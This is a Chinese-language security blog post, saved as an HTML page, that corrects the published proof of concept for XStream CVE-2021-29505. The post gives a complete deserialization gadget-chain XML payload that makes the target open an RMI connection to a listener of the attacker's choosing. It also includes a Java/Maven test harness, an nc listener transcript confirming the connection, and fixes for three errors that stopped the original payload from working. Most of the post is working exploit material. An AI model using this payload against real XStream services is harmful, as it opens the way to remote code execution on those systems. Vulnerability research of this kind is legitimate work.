<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="">
<meta name="description"
    content="tags: 漏洞分析 XStream CVE-2021-29505 poc修正 官网给出的poc很怪异，无法直接跑。
https://x-stream.github.io/CVE-2021-29505.html
1. 正确poc &amp;lt;java.util.PriorityQueue serialization=&#39;custom&#39;&amp;gt; &amp;lt;unserializable-parents/&amp;gt; &amp;lt;java.util.PriorityQueue&amp;gt; &amp;lt;default&amp;gt; &amp;lt;size&amp;gt;2&amp;lt;/size&amp;gt; &amp;lt;/default&amp;gt; &amp;lt;int&amp;gt;3&amp;lt;/int&amp;gt; &amp;lt;javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;type&amp;gt;12345&amp;lt;/type&amp;gt; &amp;lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&amp;gt; &amp;lt;m__obj class=&#39;string&#39;&amp;gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&amp;lt;/m__obj&amp;gt; &amp;lt;/value&amp;gt; &amp;lt;/javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;javax.naming.ldap.Rdn_-RdnEntry&amp;gt; &amp;lt;type&amp;gt;12345&amp;lt;/type&amp;gt; &amp;lt;value class=&#39;com.sun.xml.internal.ws.api.message.Packet&#39; serialization=&#39;custom&#39;&amp;gt; &amp;lt;message class=&#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#39;&amp;gt; &amp;lt;parsedMessage&amp;gt;true&amp;lt;/parsedMessage&amp;gt; &amp;lt;soapVersion&amp;gt;SOAP_11&amp;lt;/soapVersion&amp;gt; &amp;lt;bodyParts/&amp;gt; &amp;lt;sm class=&#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#39;&amp;gt; &amp;lt;attachmentsInitialized&amp;gt;false&amp;lt;/attachmentsInitialized&amp;gt; &amp;lt;multiPart class=&#39;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#39;&amp;gt; &amp;lt;soapPart/&amp;gt; &amp;lt;mm&amp;gt; &amp;lt;it class=&#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#39;&amp;gt; &amp;lt;aliases class=&#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#39;&amp;gt; &amp;lt;candidates class=&#39;com.sun.jndi.rmi.registry.BindingEnumeration&#39;&amp;gt; &amp;lt;names&amp;gt; &amp;lt;string&amp;gt;aa&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;aa&amp;lt;/string&amp;gt; &amp;lt;/names&amp;gt; &amp;lt;ctx&amp;gt; &amp;lt;environment/&amp;gt; &amp;lt;registry class=&#39;sun.rmi.registry.RegistryImpl_Stub&#39; serialization=&#39;custom&#39;&amp;gt; &amp;lt;java.rmi.server.RemoteObject&amp;gt; &amp;lt;string&amp;gt;UnicastRef&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;127.0.0.1&amp;lt;/string&amp;gt; &amp;lt;int&amp;gt;2333&amp;lt;/int&amp;gt; &amp;lt;long&amp;gt;0&amp;lt;/long&amp;gt; &amp;lt;int&amp;gt;0&amp;lt;/int&amp;gt; &amp;lt;long&amp;gt;0&amp;lt;/long&amp;gt; &amp;lt;short&amp;gt;0&amp;lt;/short&amp;gt; &amp;lt;boolean&amp;gt;false&amp;lt;/boolean&amp;gt; &amp;lt;/java.rmi.server.RemoteObject&amp;gt; &amp;lt;/registry&amp;gt; &amp;lt;host&amp;gt;127." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html" />


<title>
    
    XStream CVE-2021-29505 poc修正 :: welcome to st0n3&#39;s blog 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.de959d61dd13c2cd41136acd491ffb0749779e1afe37b1fed6d5cba0b7e1938d.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="XStream CVE-2021-29505 poc修正">
<meta itemprop="description" content="tags: 漏洞分析 XStream CVE-2021-29505 poc修正 官网给出的poc很怪异，无法直接跑。
https://x-stream.github.io/CVE-2021-29505.html
1. 正确poc &lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;12345&lt;/type&gt; &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&gt; &lt;m__obj class=&#39;string&#39;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;12345&lt;/type&gt; &lt;value class=&#39;com.sun.xml.internal.ws.api.message.Packet&#39; serialization=&#39;custom&#39;&gt; &lt;message class=&#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#39;&gt; &lt;parsedMessage&gt;true&lt;/parsedMessage&gt; &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt; &lt;bodyParts/&gt; &lt;sm class=&#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#39;&gt; &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt; &lt;multiPart class=&#39;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#39;&gt; &lt;soapPart/&gt; &lt;mm&gt; &lt;it class=&#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#39;&gt; &lt;aliases class=&#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#39;&gt; &lt;candidates class=&#39;com.sun.jndi.rmi.registry.BindingEnumeration&#39;&gt; &lt;names&gt; &lt;string&gt;aa&lt;/string&gt; &lt;string&gt;aa&lt;/string&gt; &lt;/names&gt; &lt;ctx&gt; &lt;environment/&gt; &lt;registry class=&#39;sun.rmi.registry.RegistryImpl_Stub&#39; serialization=&#39;custom&#39;&gt; &lt;java.rmi.server.RemoteObject&gt; &lt;string&gt;UnicastRef&lt;/string&gt; &lt;string&gt;127.0.0.1&lt;/string&gt; &lt;int&gt;2333&lt;/int&gt; &lt;long&gt;0&lt;/long&gt; &lt;int&gt;0&lt;/int&gt; &lt;long&gt;0&lt;/long&gt; &lt;short&gt;0&lt;/short&gt; &lt;boolean&gt;false&lt;/boolean&gt; &lt;/java.rmi.server.RemoteObject&gt; &lt;/registry&gt; &lt;host&gt;127.">
<meta itemprop="datePublished" content="2021-05-24T03:32:41+00:00" />
<meta itemprop="dateModified" content="2021-05-24T03:32:41+00:00" />
<meta itemprop="wordCount" content="285">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="XStream CVE-2021-29505 poc修正"/>
<meta name="twitter:description" content="tags: 漏洞分析 XStream CVE-2021-29505 poc修正 官网给出的poc很怪异，无法直接跑。
https://x-stream.github.io/CVE-2021-29505.html
1. 正确poc &lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt; &lt;unserializable-parents/&gt; &lt;java.util.PriorityQueue&gt; &lt;default&gt; &lt;size&gt;2&lt;/size&gt; &lt;/default&gt; &lt;int&gt;3&lt;/int&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;12345&lt;/type&gt; &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&gt; &lt;m__obj class=&#39;string&#39;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;12345&lt;/type&gt; &lt;value class=&#39;com.sun.xml.internal.ws.api.message.Packet&#39; serialization=&#39;custom&#39;&gt; &lt;message class=&#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#39;&gt; &lt;parsedMessage&gt;true&lt;/parsedMessage&gt; &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt; &lt;bodyParts/&gt; &lt;sm class=&#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#39;&gt; &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt; &lt;multiPart class=&#39;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#39;&gt; &lt;soapPart/&gt; &lt;mm&gt; &lt;it class=&#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#39;&gt; &lt;aliases class=&#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#39;&gt; &lt;candidates class=&#39;com.sun.jndi.rmi.registry.BindingEnumeration&#39;&gt; &lt;names&gt; &lt;string&gt;aa&lt;/string&gt; &lt;string&gt;aa&lt;/string&gt; &lt;/names&gt; &lt;ctx&gt; &lt;environment/&gt; &lt;registry class=&#39;sun.rmi.registry.RegistryImpl_Stub&#39; serialization=&#39;custom&#39;&gt; &lt;java.rmi.server.RemoteObject&gt; &lt;string&gt;UnicastRef&lt;/string&gt; &lt;string&gt;127.0.0.1&lt;/string&gt; &lt;int&gt;2333&lt;/int&gt; &lt;long&gt;0&lt;/long&gt; &lt;int&gt;0&lt;/int&gt; &lt;long&gt;0&lt;/long&gt; &lt;short&gt;0&lt;/short&gt; &lt;boolean&gt;false&lt;/boolean&gt; &lt;/java.rmi.server.RemoteObject&gt; &lt;/registry&gt; &lt;host&gt;127."/>




<meta property="article:published_time" content="2021-05-24 03:32:41 &#43;0000 UTC" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ cd /home/st0n3</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/aboutme.html">About</a></li><li><a href="/post.html">Blog</a></li><li><a href="/hackerbot">Hackerbot</a></li><li><a href="/skill_tree/">SkillTree</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">XStream CVE-2021-29505 poc修正</a></h2>

            

            <div class="post-content">
                <hr>
<h2 id="tags-漏洞分析">tags: 漏洞分析</h2>
<h1 id="xstream-cve-2021-29505-poc修正">XStream CVE-2021-29505 poc修正</h1>
<p>官网给出的poc很怪异，无法直接跑。</p>
<p><a href="https://x-stream.github.io/CVE-2021-29505.html">https://x-stream.github.io/CVE-2021-29505.html</a></p>
<h2 id="1-正确poc">1. 正确poc</h2>
<pre><code class="language-xml!" data-lang="xml!">&lt;java.util.PriorityQueue serialization='custom'&gt;
    &lt;unserializable-parents/&gt;
    &lt;java.util.PriorityQueue&gt;
        &lt;default&gt;
            &lt;size&gt;2&lt;/size&gt;
        &lt;/default&gt;
        &lt;int&gt;3&lt;/int&gt;
        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
            &lt;type&gt;12345&lt;/type&gt;
            &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
                &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt;
            &lt;/value&gt;
        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
            &lt;type&gt;12345&lt;/type&gt;
            &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
                &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
                    &lt;bodyParts/&gt;
                    &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
                        &lt;multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'&gt;
                            &lt;soapPart/&gt;
                            &lt;mm&gt;
                                &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
                                    &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;
                                        &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;
                                            &lt;names&gt;
                                                &lt;string&gt;aa&lt;/string&gt;
                                                &lt;string&gt;aa&lt;/string&gt;
                                            &lt;/names&gt;
                                            &lt;ctx&gt;
                                                &lt;environment/&gt;
                                                &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;
                                                    &lt;java.rmi.server.RemoteObject&gt;
                                                        &lt;string&gt;UnicastRef&lt;/string&gt;
                                                        &lt;string&gt;127.0.0.1&lt;/string&gt;
                                                        &lt;int&gt;2333&lt;/int&gt;
                                                        &lt;long&gt;0&lt;/long&gt;
                                                        &lt;int&gt;0&lt;/int&gt;
                                                        &lt;long&gt;0&lt;/long&gt;
                                                        &lt;short&gt;0&lt;/short&gt;
                                                        &lt;boolean&gt;false&lt;/boolean&gt;
                                                    &lt;/java.rmi.server.RemoteObject&gt;
                                                &lt;/registry&gt;
                                                &lt;host&gt;127.0.0.1&lt;/host&gt;
                                                &lt;port&gt;2333&lt;/port&gt;
                                            &lt;/ctx&gt;
                                        &lt;/candidates&gt;
                                    &lt;/aliases&gt;
                                &lt;/it&gt;
                            &lt;/mm&gt;
                        &lt;/multiPart&gt;
                    &lt;/sm&gt;
                &lt;/message&gt;
            &lt;/value&gt;
        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;/java.util.PriorityQueue&gt;
&lt;/java.util.PriorityQueue&gt;
</code></pre><p>使用nc监听2333,会接受到rmi连接</p>
<pre><code>st0n3@yoga:~$ nc -n -lvp 2333
listening on [any] 2333 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 57078
JRMIK
</code></pre><h2 id="2-poc调试">2. poc调试</h2>
<p>简单写一段代码进行调试，分别解决了下文几个错误。</p>
<p>Main.java</p>
<pre><code class="language-java!" data-lang="java!">import com.thoughtworks.xstream.XStream;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Main {
    public static void main(String[] args) throws IOException {
        String xml = new String(Files.readAllBytes(Paths.get(&quot;/payload.xml&quot;)));
        System.out.println(xml);
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
</code></pre><p>pom.xml</p>
<pre><code class="language-xml!" data-lang="xml!">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;
         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;

    &lt;groupId&gt;org.example&lt;/groupId&gt;
    &lt;artifactId&gt;hello_xstream&lt;/artifactId&gt;
    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;

    &lt;properties&gt;
        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
    &lt;/properties&gt;

    &lt;dependencies&gt;
        &lt;!-- https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream --&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.thoughtworks.xstream&lt;/groupId&gt;
            &lt;artifactId&gt;xstream&lt;/artifactId&gt;
            &lt;version&gt;1.4.16&lt;/version&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;


    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;
                &lt;version&gt;2.5.5&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;archive&gt;
                        &lt;manifest&gt;
                            &lt;mainClass&gt;Main&lt;/mainClass&gt;
                        &lt;/manifest&gt;
                    &lt;/archive&gt;
                    &lt;descriptorRefs&gt;
                        &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;
                    &lt;/descriptorRefs&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
&lt;/project&gt;
</code></pre><h3 id="21-none标签没有结束">2.1 <code>&lt;none&gt;</code>标签没有结束</h3>
<pre><code class="language-!" data-lang="!">Caused by: org.xmlpull.v1.XmlPullParserException: end tag name &lt;/m__obj&gt; must match start tag name &lt;none&gt; from line 11 (position: START_TAG seen ...l.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;... @11:116) 
	at io.github.xstream.mxparser.MXParser.parseEndTag(MXParser.java:1693)
	at io.github.xstream.mxparser.MXParser.nextImpl(MXParser.java:1183)
	at io.github.xstream.mxparser.MXParser.next(MXParser.java:1104)
</code></pre><p>报错为<code>m_obj</code>变量中有一个没有闭合的<code>none</code>标签</p>
<p><code>&lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;</code></p>
<p><code>m_obj</code>似乎是什么值无所谓，直接把这个标签去掉，如</p>
<p><code>&lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none&lt;/m__obj&gt;</code></p>
<h3 id="22-message1_1impl没有soappart">2.2 Message1_1Impl没有soapPart</h3>
<p>报错为
<code>No such field com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl.soapPart</code></p>
<p>涉及的xml为</p>
<pre><code class="language-xml!" data-lang="xml!">&lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
    &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
    &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
        &lt;soapPart/&gt;
            &lt;mm&gt;
            &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;

...
</code></pre><p>很奇怪的是sm是<code>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl</code>，
其下的multiPart变量类型为MimeMultipart，不可能是<code>com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl</code></p>
<p>通过搜索rt.jar源码发现，实际拥有<code>soapPart</code>成员变量的类应该是<code>com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart</code></p>
<p><a href="https://github.com/yuexiahandao/RT-JAR-CODE/blob/d5b2590518ffb83596a3aa3849249cf871ab6d4e/com/sun/xml/internal/messaging/saaj/packaging/mime/internet/MimePullMultipart.java">https://github.com/yuexiahandao/RT-JAR-CODE/blob/d5b2590518ffb83596a3aa3849249cf871ab6d4e/com/sun/xml/internal/messaging/saaj/packaging/mime/internet/MimePullMultipart.java</a></p>
<h3 id="23-remoteobject类型错误">2.3 RemoteObject类型错误</h3>
<pre><code class="language-!" data-lang="!">Caused by: java.lang.ClassCastException: java.lang.Short cannot be cast to java.lang.Long
	at com.thoughtworks.xstream.core.util.CustomObjectInputStream.readLong(CustomObjectInputStream.java:159)
    ...
</code></pre><pre><code class="language-xml!" data-lang="xml!">&lt;java.rmi.server.RemoteObject&gt;
    &lt;string&gt;UnicastRef&lt;/string&gt;
    &lt;string&gt;ip2&lt;/string&gt;
    &lt;int&gt;1099&lt;/int&gt;
    &lt;long&gt;0&lt;/long&gt;
    &lt;int&gt;0&lt;/int&gt;
    &lt;short&gt;0&lt;/short&gt;
    &lt;boolean&gt;false&lt;/boolean&gt;
&lt;/java.rmi.server.RemoteObject&gt;
</code></pre><p>经过一段时间的debug，发现缺少了一个long类型的变量：</p>
<pre><code class="language-xml!" data-lang="xml!">&lt;java.rmi.server.RemoteObject&gt;
    &lt;string&gt;UnicastRef&lt;/string&gt;
    &lt;string&gt;127.0.0.1&lt;/string&gt;
    &lt;int&gt;2333&lt;/int&gt;
    &lt;long&gt;0&lt;/long&gt;
    &lt;int&gt;0&lt;/int&gt;
    &lt;long&gt;0&lt;/long&gt;
    &lt;short&gt;0&lt;/short&gt;
    &lt;boolean&gt;false&lt;/boolean&gt;
&lt;/java.rmi.server.RemoteObject&gt;
</code></pre>
            </div>
        </article>

        <hr />

        <div class="post-info">
  			</div>

        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            
            <span></span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/st0n3">st0n3</a></span>
            <span>Based on <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>

    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      extensions: ["tex2jax.js"],
      
      jax: ["input/TeX", "output/CommonHTML"],
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"] ],
        displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
        processEscapes: true
      },
      "HTML-CSS": { fonts: ["TeX"] },
      displayAlign: "left"
    });
  </script>

<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_CHTML"></script>


</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>



    </body>
</html>
